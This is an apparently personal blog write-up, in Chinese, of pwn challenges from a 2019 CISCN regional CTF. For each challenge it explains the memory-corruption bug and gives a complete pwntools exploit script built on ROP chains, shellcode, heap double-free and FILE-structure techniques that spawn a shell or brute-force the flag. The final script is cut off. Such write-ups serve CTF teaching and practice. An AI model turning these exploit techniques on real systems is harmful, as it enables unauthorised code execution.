@@ -1,0 +1,1109 @@
+---
+layout: post
+title:  "2019.6.10 CISCN pwn"
+tags: [writeup, pwn, shellcode, offbynull, heap]
+date: 2019-06-10
+comments: false
+---
+
+# CISCN 华东北赛区分区赛 pwn writeup
+
+
+
+
+
+# 第一天
+
+## arm
+
+![5d00b9a4c3d3637584](https://i.loli.net/2019/06/12/5d00b9a4c3d3637584.png)
+
+![5d00b996bbccd24067](https://i.loli.net/2019/06/12/5d00b996bbccd24067.png)
+
+32位arm架构，明显的栈溢出。动态链接的程序，本地使用qemu+gdb-multiarch来调试，查看栈上能泄露什么信息。
+
+先下载共享库:
+
+```
+sudo apt-get install gcc-5-arm-linux-gnueabi
+```
+
+qemu运行之:
+
+```
+qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./1
+```
+
+gdb连上,在read处下断，c过去:
+
+```
+gdb-multiarch 1 -q
+set architecture arm
+target remote :1234
+b *0x105B8
+
+```
+
+查看写入的栈上能泄露出什么数据。
+
+![5d00bb240975674661](https://i.loli.net/2019/06/12/5d00bb240975674661.png)
+
+![5d00bb45a59f914163](https://i.loli.net/2019/06/12/5d00bb45a59f914163.png)
+
+如图可见，输入41个字节可以泄露`0xf67a7000`这个地址，它显然是libc中的一个地址。
+
+查看一下里面的内容。
+
+![5d00bfc86318937015](https://i.loli.net/2019/06/12/5d00bfc86318937015.png)
+
+显而易见，这个libc中got表的位置。
+
+通过多次测试，发现远程服务器泄露出来的地址都为`0xf67c8000`，可以判断出远程没有开启ASLR。
+
+使用`readelf -S libc-2.23.so`来获取libc中各个段的offset。
+
+![5d00c0475bd3524923](https://i.loli.net/2019/06/12/5d00c0475bd3524923.png)
+
+可以找到.got的偏移，由此可以计算远程libc的基地址。
+
+接着用找rop控制r0 pc来执行`system('ls')`即可getshell。
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月01日 星期六 10时37分34秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = remote('172.29.21.112', 9999)
+libc = ELF('libc-2.23.so')
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+
+
+libcbase  = 0xf67c8000 - 0x13f000
+success('libcbase ' + hex(libcbase))
+pad = 36
+'''
+0x0010dc84 : pop {r0, pc}
+'''
+prp = libcbase + 0x0010dc84
+binshaddr = libcbase + libc.search('/bin/sh').next()
+sysaddr  = libcbase + libc.symbols['system']
+io.recv()
+
+pay = 'a'*pad  + p32(prp)  + p32(binshaddr) + p32(sysaddr)
+io.send(pay)
+io.interactive()
+```
+
+
+
+## magicheap
+
+这题手速快抢了个一血hh
+
+保护全开.free功能处明显的double free
+
+unsorted bin泄露libc.
+
+double free改malloc_hook为onegadget，试了一下由于栈环境的问题导致one_gadget失效。
+
+通过使用malloc_hook来跳进realloc来调整栈环境再配合realloc_hook来getshell成功。
+
+
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月01日 星期六 09时07分23秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+#io = process('./pwn')
+io=remote('172.29.21.118', 9999)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' ,'-c']
+
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+def add(s,c):
+	io.sendlineafter('choice:','1')
+	io.sendlineafter('size of story: \n',str(s))
+	io.sendafter('npute the story: \n',c)
+
+def dele(idx):
+	io.sendlineafter('choice:','4')
+	io.sendlineafter('he index:',str(idx))
+
+
+io.recv()
+io.send('A'*8)
+io.recvuntil('AAAAAAAA')
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - 0x6fdbd
+success('libcbase ' + hex(libcbase))
+mallochookaddr = libcbase + libc.symbols['__malloc_hook']
+libcrealloc = libcbase + libc.symbols['__libc_realloc']
+fakechunk = mallochookaddr - 0x23
+success('mallochook ' +hex(mallochookaddr))
+io.send('111')
+
+add(0x60,'0') 
+add(0x60,'1')
+add(0x60,'2')
+add(0x60,'3')
+
+dele(1)
+dele(2)
+dele(1)
+
+onegad  = libcbase + 0xf1147#0xf02a4#0xf1147
+
+add(0x60,p64(fakechunk))
+add(0x60,'aaa')
+add(0x60,'aaa')
+add(0x60,'b'*(19-8)+p64(onegad) + p64(libcrealloc+0x14))
+
+io.interactive()
+```
+
+
+
+## moneygame
+
+![5d00c27a72dca72095](https://i.loli.net/2019/06/12/5d00c27a72dca72095.png)
+
+没开NX，可能会用到shellcode。
+
+程序主要围绕一个名为Player的对象，函数调用是通过虚表来进行的。
+
+![5d00c2db8fe4135269](https://i.loli.net/2019/06/12/5d00c2db8fe4135269.png)
+
+![5d00c30c0202726566](https://i.loli.net/2019/06/12/5d00c30c0202726566.png)
+
+v3 是player对象的指针，v3指向堆上。
+
+堆上player对象的前8bytes为对象虚表指针，指向`0x2030d88`。
+
+![5d00c730db60342682](https://i.loli.net/2019/06/12/5d00c730db60342682.png)
+
+![5d00c76a6da7750615](https://i.loli.net/2019/06/12/5d00c76a6da7750615.png)
+
+qword_204088好像是故意留的后门，它存在bss段上，它的内容为指向player对象+12的指针。
+
+![5d00c6e98573088754](https://i.loli.net/2019/06/12/5d00c6e98573088754.png)
+
+
+
+show处可以任意泄露。
+
+edit处输入一个偏移，可以堆上任意写。但是两个偏移之间最少有8字节的`\x00`，因为它以12bytes为间隔写8bytes。这里会影响到后面shellcode的利用。
+
+基本上就用到这两个func.
+
+
+
+调试一下发现show处输入-1可以泄露codebase.
+
+edit处修改-1可以修改掉对象的虚表指针。
+
+
+
+在堆上player对象+12的位置写入shellcode。edit -1修改对象的虚表指针为qword_204088，使用buy功能即可执行shellcode。
+
+
+
+这里shellcode之间由于有8字节的`\x00`间隔的原因，无法直接getshell。(也可能是我太菜233)
+
+但是发现bss段上同样也有rwx权限，因此使用堆上的shellcode向bss中写入getshell的shellcode并且jmp过去即可getshell。
+
+![5d00c7ae557c136085](https://i.loli.net/2019/06/12/5d00c7ae557c136085.png)
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月11日 星期二 12时07分16秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+context.arch = 'amd64'
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+def show(idx):
+	io.sendlineafter('Your choice:\n','4')
+	io.sendlineafter('?\n',str(idx))
+def edit(idx,c):
+	io.sendlineafter('Your choice:\n','3')
+	io.sendlineafter('id:',str(idx))
+	io.sendafter('Name:',c)
+def buy():
+	io.sendlineafter('Your choice:\n','2')
+
+shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
+
+show(-1)
+io.recvuntil('is:')
+codebase = u64(io.recv(6).ljust(8,'\x00')) - 2112952
+targetaddr = codebase + 0x204088
+bssaddr = codebase + 0x204000
+movrbx = "mov rbx,"+hex(bssaddr) + '\n'
+'''
+0:  48 bb b8 7d 75 55 55    movabs rbx,0x555555757db8
+7:  55 00 00
+a:  c7 03 6a 42 58 fe       mov    DWORD PTR [rbx],0xfe58426a
+10: c7 43 04 c4 48 99 52    mov    DWORD PTR [rbx+0x4],0x529948c4
+17: c7 43 08 48 bf 2f 62    mov    DWORD PTR [rbx+0x8],0x622fbf48
+1e: c7 43 0c 69 6e 2f 2f    mov    DWORD PTR [rbx+0xc],0x2f2f6e69
+25: c7 43 10 73 68 57 54    mov    DWORD PTR [rbx+0x10],0x54576873
+2c: c7 43 14 5e 49 89 d0    mov    DWORD PTR [rbx+0x14],0xd089495e
+33: c7 43 18 49 89 d2 0f    mov    DWORD PTR [rbx+0x18],0xfd28949
+3a: c7 43 1c 05 00 00 00    mov    DWORD PTR [rbx+0x1c],0x5
+41: ff e3                   jmp    rbx
+'''
+
+sc = "\x48\xBB\xB8\x7D\x75\x55\x55\x55\x00\x00\xC7\x03\x6A\x42\x58\xFE\xC7\x43\x04\xC4\x48\x99\x52\xC7\x43\x08\x48\xBF\x2F\x62\xC7\x43\x0C\x69\x6E\x2F\x2F\xC7\x43\x10\x73\x68\x57\x54\xC7\x43\x14\x5E\x49\x89\xD0\xC7\x43\x18\x49\x89\xD2\x0F\xC7\x43\x1C\x05\x00\x00\x00\xFF\xE3"
+
+sc2 = asm(movrbx)[0:8]
+sc2 += "\xC7\x03\x6A\x42\x58\xFE\x90\x90"
+sc2 += "\xC7\x43\x04\xC4\x48\x99\x52\x90"
+sc2 += "\xC7\x43\x08\x48\xBF\x2F\x62\x90"
+sc2 += "\xC7\x43\x0C\x69\x6E\x2F\x2F\x90"
+sc2 += "\xC7\x43\x10\x73\x68\x57\x54\x90"
+sc2 += "\xC7\x43\x14\x5E\x49\x89\xD0\x90"
+sc2 += "\xC7\x43\x18\x49\x89\xD2\x0F\x90"
+sc2 += "\xC7\x43\x1C\x05\x00\x00\x00\x90"
+sc2 += "\xFF\xE3\x90"
+#print asm(sc)
+print asm(movrbx)[0:8]
+success('codebase : '+hex(codebase))
+success('target : '+hex(targetaddr))
+#edit(-1,p64(targetaddr))
+xx=0
+for x in range(len(sc2)/8+1):
+	edit(xx,sc2[x*8:x*8+8])
+	xx += 2
+edit(-1,p64(targetaddr))
+#debug()
+buy()
+io.interactive()
+```
+
+
+
+## emachine
+
+ret2csu
+
+m00yy给写了一个解密过程，后面才发现用不到(Orz)
+
+
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月01日 星期六 10时21分36秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+#io = remote('172.29.21.119', 9999)
+elf = ELF('./pwn')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+
+pad = 88
+poprdi = 0x0000000000400c83
+putsgot = elf.got['puts']
+putsplt = elf.plt['puts']
+pmain = 0x400B28
+#leakpad = 0x70
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+def enc(c):
+	io.sendlineafter('ice!\n','1')
+	io.sendafter('encrypted\n',c)
+def dd(enc):
+	res = ''
+	for i in range(len(enc)):
+		if ord(enc[i]) <= 96 or ord(enc[i]) > 122:
+			if ord(enc[i]) <= 64 or ord(enc[i]) > 90:
+				if ord(enc[i]) > 47 or ord(enc[i]) <= 57:
+					res += chr(ord(enc[i]) ^ 0xf)
+			else :
+				res += chr(ord(enc[i]) ^ 0xe)
+		else :
+			res += chr(ord(enc[i]) ^ 0xd)
+	return enc
+pay = 'a'*pad + p64(poprdi) + p64(putsgot) + p64(putsplt) + p64(pmain)
+#pay =dd(pay) 
+
+enc(pay)
+io.send('\n')
+io.recvuntil('llll\x83\x0c\x40\x0a')
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - libc.symbols['puts']
+success('libcbase : '+hex(libcbase))
+#debug()
+shaddr = libcbase + libc.search('/bin/sh').next()
+sysaddr = libcbase + libc.symbols['system']
+
+pay2 = 'a'*pad + p64(poprdi) + p64(shaddr) + p64(sysaddr)
+#pay2 = dd(pay2)
+
+enc(pay2)
+io.interactive()
+```
+
+
+
+## note
+
+off-by-null，这个题是通过off-by-one来改掉last_reminder的size位从而使得再malloc时不会修改下面chunk的presize位而有机会进行chunk shrink.使得两个指针指向同一块chunk。
+
+构造overlapped chunk之后，就简单了。
+
+刚开始尝试了改mallochook reallochook freehook stdio等方法，但大多都因为输入被`\x00`截断而失败 :(
+
+
+
+程序开始要求输入`name`。并将其存在堆上。
+
+![5d00ca1aa4e0718616](https://i.loli.net/2019/06/12/5d00ca1aa4e0718616.png)
+
+注意到程序调用leave函数时先向`ptr+4`即上图中堆上的`0x0000556506513040`指针中写入最多64字节得数据，接着调用free释放掉了`name`，如上图即`free(0x556506513000)`。
+
+
+
+最终找到两种方法来getshell：
+
+1.通过overlapped chunk，unsorted bin来泄露libc 泄露heap。在刚开始输入name时输入`/bin/sh`和一个合适的size用于后面伪造chunk。由于有heapbase，便可以通过double free来利用前面伪造的size在heapbase附近伪造chunk，从而覆写到`0x0000556506513040`这个指针,将其改为__free_hook指针。这样`leave`时就可以修改__free_hook为system，接着的free便会调用`system('/bin/sh')`从而getshell。
+
+
+
+2.程序在add功能处存在一个下标溢出。可以导致新建chunk覆盖掉原本的`ptr`
+
+![5d00ccc406b1732200](https://i.loli.net/2019/06/12/5d00ccc406b1732200.png)
+
+如图程序输入name时存储的ptr指针就在`list`下面，由于可以被新建得chunk给覆盖掉。
+
+覆盖掉之后，在偏移`0x20`的位置写入我们想要写值的指针，当程序`leave`时就会造成一次任意写。同样的这里可以写`__free_hook`为`system`地址配合`/bin/sh`来getshell
+
+
+
+double free exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月01日 星期六 09时43分14秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+
+def add(l,c):
+	io.sendlineafter('choice> ','1')
+	io.sendafter('length> ',str(l))
+	io.sendlineafter('ontent> ',c)
+
+def show(idx):
+	io.sendlineafter('choice> ','2')
+	io.sendafter('index> ',str(idx))
+
+def dele(idx):
+        io.sendlineafter('choice> ','3')
+        io.sendafter('index> ',str(idx))
+
+def bye(c):
+	io.sendlineafter("choice> ",'4')
+	io.sendlineafter('remarks> ',c)
+
+io.recv()
+io.sendline('/bin/sh||        \x51')
+
+add(0xf8,'0')
+#debug()
+add(0xf8,'1')
+add(0xf8,'2')
+add(0xf8,'3')
+add(0xf8,'4')
+add(0xf8,'5')
+#add(0xe0,'3')
+#add(0xe0,'4')
+#debug()
+#add(0x200,'cccc')
+#show(1)
+dele(0)
+dele(1)
+dele(2)
+add(0xf0,'0')
+add(0x88,'1')
+add(0x38,'2') #2
+add(0xd8+0x20,'6')
+#add(0x8,'4')
+#debug()
+dele(1)
+dele(3)
+#debug()
+add(0x88,'1')
+show(2)
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - 3951480
+success('libcbase : '+hex(libcbase))
+#fakechunk = libcbase + libc.symbols['__malloc_hook'] - 0x23
+libcrealloc = libcbase + libc.symbols['__libc_realloc']
+freehook = libcbase + libc.symbols['__free_hook']
+fakechunk = libcbase + 3951445
+faketop = freehook - 0xb58
+#debug()
+add(0x88,'3') #overlap 2
+
+
+add(0x1e8,'7')
+
+#debug()
+add(0x88,'8')
+#dele(8)
+#debug()
+add(0x88,'9')
+dele(8)
+dele(3)
+show(2)
+heapbase = u64(io.recv(6).ljust(8,'\x00')) - 1776
+fakechunk = heapbase + 25
+success('heapbase :' + hex(heapbase))
+success('fakechunk : '+hex(fakechunk))
+add(0x38,'3')
+add(0x38,'8')
+add(0x38,'10') #overlap 2
+#dele(3)
+
+dele(10)
+dele(3)
+dele(2)
+
+add(0x38,p64(fakechunk))
+add(0x38,'x')
+add(0x38,'aaa')
+add(0x38,'A'*7+p64(freehook))
+
+bye(p64(libcbase + libc.symbols['system']))
+io.interactive()
+```
+
+
+
+idxoverflow:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月01日 星期六 09时43分14秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+
+def add(l,c):
+	io.sendlineafter('choice> ','1')
+	io.sendafter('length> ',str(l))
+	io.sendlineafter('ontent> ',c)
+
+def show(idx):
+	io.sendlineafter('choice> ','2')
+	io.sendafter('index> ',str(idx))
+
+def dele(idx):
+        io.sendlineafter('choice> ','3')
+        io.sendafter('index> ',str(idx))
+
+def bye(c):
+	io.sendlineafter("choice> ",'4')
+	io.sendlineafter('> ',c)
+
+io.recv()
+io.sendline('')
+
+add(0xf8,'0')
+#debug()
+add(0xf8,'1')
+add(0xf8,'2')
+add(0xf8,'3')
+add(0xf8,'4')
+add(0xf8,'5')
+#add(0xe0,'3')
+#add(0xe0,'4')
+#debug()
+#add(0x200,'cccc')
+#show(1)
+dele(0)
+dele(1)
+dele(2)
+add(0xf0,'0')
+add(0x88,'1')
+add(0x38,'2') #2
+add(0xd8+0x20,'6')
+#add(0x8,'4')
+#debug()
+dele(1)
+dele(3)
+#debug()
+add(0x88,'1')
+show(2)
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - 3951480
+success('libcbase : '+hex(libcbase))
+#fakechunk = libcbase + libc.symbols['__malloc_hook'] - 0x23
+libcrealloc = libcbase + libc.symbols['__libc_realloc']
+freehook = libcbase + libc.symbols['__free_hook']
+fakechunk = libcbase + 3951445
+faketop = freehook - 0xb58
+
+add(0x38,'3')
+add(0x38,'7')
+add(0x38,'8')
+add(0x138+0x60,'9')
+add(0x70,'10')
+add(0x8,'11')
+add(0x8,'12')
+add(0x8,'13')
+add(0x8,'14')
+add(0x8,'15')
+add(0x8,'16')
+add(0x8,'17')
+add(0x8,'18')
+add(0x8,'19')
+
+add(0x58,'/bin/sh;'*2+'/bin/sh  ||     '+p64(libcbase + libc.sym['__free_hook']))
+
+
+bye(p64(libcbase+libc.sym['system']))
+io.interactive()
+```
+
+
+
+---
+
+# 第二天
+
+
+
+## bookmark
+
+edit功能处存在一个很奇怪的off-by-null.当edit第一个chunk时输入的url长度为16时，有几率会将下一个chunk的指针清零。也有几率将下一个chunk指针的低一字节覆盖为`\x00`，如下三图分别是`正常情况`，`全部清零`，`off-by-null`(很玄学)
+
+![5d00d0144e8b547634](https://i.loli.net/2019/06/12/5d00d0144e8b547634.png)
+
+![5d00d08b0c7d147129](https://i.loli.net/2019/06/12/5d00d08b0c7d147129.png)
+
+![5d00cf7291f5569070](https://i.loli.net/2019/06/12/5d00cf7291f5569070.png)
+
+
+
+这样再修改第二个chunk时便可以从heapbase开始直接覆写`0x500`个字节
+
+这里通过unsorted bin attack攻击IO_FILE来getshell。
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月02日 星期日 09时16分08秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+
+io = process('./pwn')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+#context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+
+def add(u,s,n):
+	io.sendlineafter('Input your choice >>','1')
+	io.sendlineafter('url: ',str(u))
+	io.sendafter('size: ',str(s))
+	io.sendafter('name: ',n)
+
+def dele(idx):
+	io.sendlineafter('Input your choice >>','2')
+	io.sendlineafter('index: ',str(idx))
+
+def edit(idx,u,n):
+	io.sendlineafter('Input your choice >>','3')
+	io.sendlineafter('ex: ',str(idx))
+	io.sendlineafter('url: ',str(u))
+	io.sendafter('name: ',n)
+
+def show():
+	io.sendlineafter('Input your choice >>','4')
+
+#debug()
+def pack_file(_flags = 0,
+              _IO_read_ptr = 0,
+              _IO_read_end = 0,
+              _IO_read_base = 0,
+              _IO_write_base = 0,
+              _IO_write_ptr = 0,
+              _IO_write_end = 0,
+              _IO_buf_base = 0,
+              _IO_buf_end = 0,
+              _IO_save_base = 0,
+              _IO_backup_base = 0,
+              _IO_save_end = 0,
+              _IO_marker = 0,
+              _IO_chain = 0,
+              _fileno = 0,
+              _lock = 0,
+              _wide_data = 0,
+              _mode = 0):
+    file_struct = p32(_flags) + \
+            p32(0) + \
+            p64(_IO_read_ptr) + \
+            p64(_IO_read_end) + \
+            p64(_IO_read_base) + \
+            p64(_IO_write_base) + \
+            p64(_IO_write_ptr) + \
+            p64(_IO_write_end) + \
+            p64(_IO_buf_base) + \
+            p64(_IO_buf_end) + \
+            p64(_IO_save_base) + \
+            p64(_IO_backup_base) + \
+            p64(_IO_save_end) + \
+            p64(_IO_marker) + \
+            p64(_IO_chain) + \
+            p32(_fileno)
+    file_struct = file_struct.ljust(0x88, "\x00")
+    file_struct += p64(_lock)
+    file_struct = file_struct.ljust(0xa0, "\x00")
+    file_struct += p64(_wide_data)
+    file_struct = file_struct.ljust(0xc0, '\x00')
+    file_struct += p64(_mode)
+    file_struct = file_struct.ljust(0xd8, "\x00")
+    return file_struct
+
+def finalonegadget(libc,libcbase):
+    _IO_list_all_ptr = libc.symbols['_IO_list_all'] + libcbase
+    _IO_str_jumps_addr = libc.symbols['_IO_file_jumps'] + 0xc0 + libcbase
+    binshaddr = libcbase + libc.search('/bin/sh').next()
+    sysaddr = libcbase + libc.symbols['system']
+    payload = pack_file(_flags = 0,
+                        _IO_read_ptr = 0x61, #smallbin[4] 0x60 offset
+                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,
+                        _IO_write_base = 2,
+                        _IO_write_ptr = 3,
+                        _IO_buf_base = binshaddr,
+                        _mode = 0,
+                        )
+    payload += p64(_IO_str_jumps_addr-0x8) # vtable @ offset 0xd0
+    payload += p64(0) 
+    payload += p64(sysaddr)  # offset 0xe0+8
+    return payload
+n=0
+while n<9999:
+	try:
+		io = process('./pwn')
+		add('aaa',0x80,'b'*0x61)
+		add('bbb',0x500,'1')
+		add('ccc',0x80,'2')
+		add('ccc',0x300,'3')
+		#add('ccc',0x80,'4')
+		#add('ccc',0x80,'5')
+		dele(0)
+		add('aaa',0x80,'3'*8)
+		show()
+		io.recvuntil('3'*8)
+		libcbase = u64(io.recv(6).ljust(8,'\x00')) - 0x3c4b78
+		success('libc: '+hex(libcbase))
+		dele(0)
+		gdb.attach(io)
+		url = "%61"*16
+		edit(1,url,'1')
+		#debug()
+		pay = p64(0)+p64(0x21)+p64(0)*2
+		pay += finalonegadget(libc,libcbase)
+		#io.sendlineafter('Input your choice >>','3')
+		io.sendline('')
+		io.sendline('')
+		io.sendline('')
+		#debug()
+		#io.interactive()
+		#io.sendline('3')
+		edit(1,'1',pay)
+		#debug()
+		io.sendlineafter('hoice >>','1')
+		io.sendlineafter('rl: ','1')
+		io.sendlineafter('size: ','64')
+		#n =n-1
+		io.recv()
+		io.sendline('ls')
+		io.recv()
+		success('got shell !')
+		io.interactive()
+	except EOFError:
+		n = n +1
+		print "Trying ..."+str(n)
+```
+
+
+
+## easy_pwn
+
+大概就是程序把flag读到了堆上，输入一个idx，返回flag中的一个字节。
+
+输入一段4字节的shellcode。输入一个size并新建对应大小的chunk，向里面输入字符串，打印出输入的字符串，这里注意这个printf函数带了一个并不需要的参数`size`，即输出的长度。
+
+![5d00d49983a4d73038](https://i.loli.net/2019/06/12/5d00d49983a4d73038.png)
+
+然后执行之前输入的`shellcode`，将返回值rax与刚刚返回地flag进行比较。相同和不相同输出不同的字符串。
+
+
+
+所以思路就是爆破，利用shellcode来控制rax为爆破的字符。
+
+但是程序限制了shellcode只能使用给定范围之内的:
+
+```python
+sclist = "\x67\x20\x64\x6E\x6F\x63\x65\x73\x6F\x66\x20\xC3\x20\x74\x66\x69\x41\x51\x20\x75\x6F\x79\x20\x72\x44\x58\x20\x51""
+```
+
+先简单看一下这串'shellcode'都是哪些指令：
+
+```
+0:  67 20 64 6e 6f          and    BYTE PTR [esi+ebp*2+0x6f],ah
+5:  63 65 73                movsxd esp,DWORD PTR [rbp+0x73]
+8:  6f                      outs   dx,DWORD PTR ds:[rsi]
+9:  66 20 c3                data16 and bl,al
+c:  20 74 66 69             and    BYTE PTR [rsi+riz*2+0x69],dh
+10: 41 51                   push   r9
+12: 20 75 6f                and    BYTE PTR [rbp+0x6f],dh
+15: 79 20                   jns    0x37
+17: 72 44                   jb     0x5d 
+19: 58                      pop    rax
+1a: 20                      .byte 0x20
+1b: 51                      push   rcx
+```
+
+这样显示的是不全的，但是大概看一下够了。还有`\x3c`即ret指令，是题目给的提示。
+
+
+
+可以看到有pop rax,push各种寄存器，可以想到是将数据push到栈上然后pop到rax最后ret。
+
+动态调一下看看详细情况，断在`call rax`。
+
+这里我输入的name长度为12，可以看到返回数据的长度为`0x21`.
+
+![5d00d60f939aa31723](https://i.loli.net/2019/06/12/5d00d60f939aa31723.png)
+
+![5d00d5c9960cb42377](https://i.loli.net/2019/06/12/5d00d5c9960cb42377.png)
+
+通过观察发现call rax时r9寄存器的值也为`0x21`.多次调试发现r9寄存器的值为:`name的长度 + 21`
+
+si步入：
+
+![5d00d69c5535120568](https://i.loli.net/2019/06/12/5d00d69c5535120568.png)
+
+先push 再 pop 再ret即可正常返回。
+
+同时发现前面可用shellcode中存在push r9
+
+```
+10: 41 51 push r9
+```
+
+因此完整shellcode就为:
+
+```
+sc = "\x41\x51\x58\xc3"
+```
+
+通过控制输入name的长度可以达到爆破flag的效果。
+
+
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月12日 星期三 08时41分38秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+
+#context.log_level = 'debug'
+
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+context.arch = 'amd64'
+
+
+#gdb.attach(io,'''
+#b *0x400d88
+#''')
+# range(33 ,127)
+def check(io,x,y):
+	#io = process('./pwn')
+	io.sendlineafter('uts your index?\n',str(y))
+
+	#code = '''
+	#push r9
+	#pop rax
+	#ret
+	#'''
+	#code = asm(code)
+	code = "\x41\x51\x58\xc3"
+	#gdb.attach(io,'''
+	#b *0x400EA5 
+	#''')
+
+	io.sendafter('code:\n',code)
+	io.sendlineafter('name size:\n',str(256))
+	io.sendafter('your name:\n','a'*(x-21))
+	io.recv()
+	io.send('\n')
+	
+	if 'bye' in io.recv():
+		return chr(x)
+	else:
+		return 0
+
+flag = ''
+f=''
+x=32
+y=0
+while True:
+	x = x + 1
+	io = process('./pwn')
+	f = check(io,x,y)
+	if f:
+		flag += f
+		y += 1
+		x = 32
+	print flag
+	io.close()
+```
+
+
+
+## message
+
+这题0解，Orz..
+
+上来先是一个rc6.
+
+漏洞出在:
+
+![5d00d889c4f2253700](https://i.loli.net/2019/06/12/5d00d889c4f2253700.png)
+
+![5d00d8a700a7263890](https://i.loli.net/2019/06/12/5d00d8a700a7263890.png)
+
+写入0x80字节，buf距离栈底只有40字节，妥妥的溢出。
+
+程序write等功能是通过syscall来调用的。
+
+用了seccomp来限制系统调用号只能为`0,2,0x3c`即`read,open,exit`，也就限制了能用的rop。
+
+
+
+提示爆破
+
+rop，通过read和pop rsp等一些gadgets做栈迁移。open打开flag文件，使用read将flag值读到bss上，利用程序中jge这个gadget来对两个值进行比较从而达到爆破flag的目的。
+
+
+
+exp:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年06月11日 星期二 19时43分01秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+#io = process('./pwn')
+
+#context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+def login():
+	io.sendlineafter('5.quit\n','0')
+	io.sendlineafter('Username:','root')
+	io.sendlineafter('Password:','youknowtoomuch')
+def mes(c):
+	io.sendlineafter('5.quit\n','3')
+	io.sendafter('message\n',c)
+
+'''
+%rax	System call	%rdi	        %rsi	        %rdx	       
+0	sys_read	fd	        char *buf	size_t count		
+2	sys_open	*filename	int flags	int mode
+
+
+0000000000400A46 ; __unwind {
+.text:0000000000400A46                 mov     rsi, rdi        ; buf
+.text:0000000000400A49                 mov     rax, 0
+.text:0000000000400A50                 mov     rdi, 0          ; fd
+.text:0000000000400A57                 mov     rdx, 80h        ; count
+.text:0000000000400A5E                 syscall                 ; LINUX - sys_read
+'''
+
+pad = 40
+readaddr = 0x400A46
+bss = 0x6020E0
+poprdiret = 0x0000000000400e13 #: pop rdi ; ret
+rsir15ret = 0x0000000000400e11# : pop rsi ; pop r15 ; ret
+poprspret = 0x00000000004008f4# : pop rsp ; ret
+eaxret = 0x00000000004007a6 #: mov eax, edi ; mov ecx, esi ; ror eax, cl ; ret #esi need to be 0
+syscall = 0x0000000000400a32# : syscall ; ret
+cmpjge = 0x400A68
+#io.recv()
+#print context.terminal[1:]
+#login()
+
+'''
+.text:0000000000400A68                 cmp     al, [rdi]
+.text:0000000000400A6A                 jge     short sub_400A24
+.text:0000000000400A6C                 retn
+'''
+dic = "abcdefghijklmnopqrstuvwxyz{}"
+
+def check(io,x,y):
+	login()
+	pay1 = 'A'*40 + p64(poprdiret) + p64(bss+0x200) + p64(readaddr) + p64(poprdiret) + p64(2) + p64(rsir15ret) + p64(0)*2 + p64(eaxret) + p64(poprspret) + p64(bss+0x208) 
+	pay1 = pay1 + '\x00'*(0x80-len(pay1))
+	mes(pay1)
+	pay2 = './flag\x00\x00' + p64(poprdiret) + p64(bss+0x200) + p64(syscall) + p64(poprdiret) + p64(bss+0x300) + p64(readaddr) + p64(poprspret) + p64(bss+0x300)
